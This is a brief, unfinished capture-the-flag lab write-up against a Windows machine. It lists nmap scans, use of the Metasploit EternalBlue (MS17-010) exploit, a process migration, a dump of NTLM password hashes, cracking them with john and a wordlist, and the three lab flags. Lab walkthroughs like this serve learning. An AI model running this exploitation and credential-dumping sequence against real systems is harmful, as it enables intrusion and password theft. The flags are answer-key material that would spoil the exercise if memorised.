# TODO: need to fininsh this

> nmap -A $TARGET
> nmap -p 1-1000 $TARGET
> nmap --script vuln -p 135,139,445,3389 $TARGET

### Metasploit

> msf\> search ms17

> msf\> use exploit/windows/smb/ms17_010_eternalblue

> msf\> sessions -u 1


> ps

migrated to 2528 SVCHOST.exe

### Cracking

> hashdump

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
> john --wordlist=/usr/share/wordlists/rockyou.txt --forman=NT jon.hash


### Flags

1. flag 1:

	> C:\>type flag1.txt

	```
	flag{access_the_machine}
	```

2. flag 2:
	googled: where does windows store passwords.

	C:\Windows\System32\config>type flag2.txt

	```
	flag{sam_database_elevated_access}
	```

3. flag 3:
	used write-ups. Didn't get the hint

	> C:\Users\Jon\Documents>type flag3.txt
	type flag3.txt
	flag{admin_documents_can_be_valuable}
